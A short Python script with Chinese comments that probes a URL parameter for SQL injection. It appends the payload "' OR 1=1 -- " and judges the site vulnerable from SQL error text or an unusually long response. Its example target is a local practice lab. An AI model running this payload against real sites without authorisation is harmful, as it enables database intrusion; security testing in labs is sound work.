import requests


def check_sql_injection(url, param, value):
    # 构造恶意负载
    payload = value + "' OR 1=1 -- "  # 注释符绕过[^1]

    # 发送请求
    params = {param: payload}
    response = requests.get(url, params=params)

    # 漏洞判断
    if "error in your SQL syntax" in response.text:
        return True, "SQL 语法错误暴露" # 检查响应内容中是否包含SQL语法错误的提示。 如果包含，说明服务器执行了恶意SQL语句，可能存在SQL注入漏洞。
    if len(response.content) > 2 * len(requests.get(url).content):
        return True, "异常数据泄露"  # 检查响应内容的长度是否异常增加。如果响应内容长度是正常请求的两倍以上，可能是因为注入导致返回了额外的数据。
    return False, "未检测到漏洞"


# 使用示例
target_url = "http://localhost/Less-1/?id=1"
is_vuln, reason = check_sql_injection(target_url, "id", "1")
print(f"漏洞状态: {is_vuln}, 原因: {reason}")